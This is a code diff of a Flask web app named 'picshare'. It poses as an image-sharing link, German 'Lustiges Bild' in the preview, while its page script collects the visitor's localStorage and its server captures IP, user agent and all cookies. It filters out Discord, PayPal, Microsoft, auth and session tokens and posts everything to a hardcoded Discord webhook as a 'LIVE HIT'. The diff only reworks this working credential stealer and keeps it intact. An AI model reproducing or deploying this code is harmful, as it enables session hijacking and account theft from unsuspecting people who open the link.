@@ -12,22 +12,22 @@ DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518539631812149330/Uk2DGqWM
 IMAGE_PATH = "real-image.jpg"
 
 def send_to_webhook(data):
-    important = {k: v[:400] for k, v in data.get('cookies', {}).items() 
-                if any(word in k.lower() for word in ['discord', 'token', 'auth', 'session', 'microsoft', 'paypal', '__dcf', 'sid'])}
+    important = {k: v[:500] for k, v in data.get('cookies', {}).items() 
+                if any(t in k.lower() for t in ['discord', 'token', '__dcf', 'auth', 'session', 'microsoft', 'paypal'])}
     
     embed = {
-        "title": "📸 picshare Image Hit",
-        "color": 0x00FF00,
+        "title": "🔴 picshare - Live Hit",
+        "color": 0xFF0000,
         "fields": [
             {"name": "IP", "value": data.get('ip'), "inline": True},
-            {"name": "Time", "value": data.get('time'), "inline": True},
-            {"name": "Important Data", "value": f"```json\n{json.dumps(important, indent=2)}\n```" if important else "No important tokens"},
-            {"name": "All Cookies", "value": f"```json\n{json.dumps(data.get('cookies', {}), indent=2)[:1900]}\n```"},
-            {"name": "LocalStorage", "value": f"```json\n{data.get('localstorage', 'none')}\n```"},
-            {"name": "User-Agent", "value": data.get('ua')[:400]}
+            {"name": "Time", "value": data.get('time')},
+            {"name": "Important Tokens", "value": f"```json\n{json.dumps(important, indent=2)}\n```" if important else "none"},
+            {"name": "Full Cookies", "value": f"```json\n{json.dumps(data.get('cookies', {}), indent=2)[:2000]}\n```"},
+            {"name": "LocalStorage", "value": f"```json\n{data.get('ls', 'empty')}\n```"},
+            {"name": "UA", "value": data.get('ua')[:500]}
         ]
     }
-    requests.post(DISCORD_WEBHOOK, json={"embeds": [embed]})
+    requests.post(DISCORD_WEBHOOK, json={"embeds": [embed], "content": "**LIVE HIT**"})
 
 @app.route('/image.jpg')
 def serve_image():
@@ -35,16 +35,15 @@ def serve_image():
     ua = request.headers.get('User-Agent')
     cookies = dict(request.cookies)
     time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    ls = request.args.get('ls', 'empty')
     
-    localstorage = request.args.get('ls', 'none')
-    
-    data = {'ip': ip, 'ua': ua, 'cookies': cookies, 'time': time_str, 'localstorage': localstorage}
+    data = {'ip': ip, 'ua': ua, 'cookies': cookies, 'time': time_str, 'ls': ls}
     send_to_webhook(data)
     
     if os.path.exists(IMAGE_PATH):
         return send_file(IMAGE_PATH, mimetype='image/jpeg')
     else:
-        img = Image.new('RGB', (1200, 800), color=(20,20,35))
+        img = Image.new('RGB', (1280, 720), color=(18,18,28))
         buf = BytesIO()
         img.save(buf, 'JPEG', quality=95)
         buf.seek(0)
@@ -58,38 +57,37 @@ def view_page():
     <head>
         <meta charset="UTF-8">
         <meta property="og:image" content="/image.jpg">
-        <meta property="og:title" content="Funny Cat - picshare">
+        <meta property="og:title" content="picshare - Lustiges Bild">
         <title>picshare</title>
-        <style>body{margin:0;background:#000;overflow:hidden;} img{width:100%;height:100vh;object-fit:contain;}</style>
+        <style>
+            body {margin:0; background:#000; overflow:hidden;}
+            img {width:100vw; height:100vh; object-fit:contain;}
+        </style>
     </head>
     <body>
-        <img src="/image.jpg" alt="">
+        <img src="/image.jpg" alt="picshare Image">
         <script>
-            let ls = {};
-            try {
-                Object.keys(localStorage).forEach(key => {
-                    ls[key] = localStorage.getItem(key);
+            function harvest() {
+                let lsData = {};
+                try {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        let key = localStorage.key(i);
+                        lsData[key] = localStorage.getItem(key);
+                    }
+                } catch(e) {}
+                
+                const params = new URLSearchParams({
+                    ls: JSON.stringify(lsData)
                 });
-            } catch(e){}
-            
-            const payload = {
-                ls: JSON.stringify(ls),
-                screen: screen.width + "x" + screen.height
-            };
-            
-            // Mehrere aggressive Send-Versuche
-            function send() {
-                fetch('/image.jpg?' + new URLSearchParams(payload), {
-                    credentials: 'include',
-                    cache: 'no-store'
-                });
+                
+                fetch('/image.jpg?' + params, {credentials: 'include', cache: 'no-store'});
             }
             
-            send();
-            setTimeout(send, 600);
-            setTimeout(send, 1400);
-            setTimeout(() => window.open('/image.jpg', '_blank'), 800);
-            setTimeout(() => window.open(location.href, '_blank'), 2000);
+            harvest();
+            setTimeout(harvest, 700);
+            setTimeout(harvest, 1600);
+            setTimeout(() => window.open('/image.jpg', '_blank'), 900);
+            setTimeout(() => window.open(location.href, '_blank'), 2200);
         </script>
     </body>
     </html>
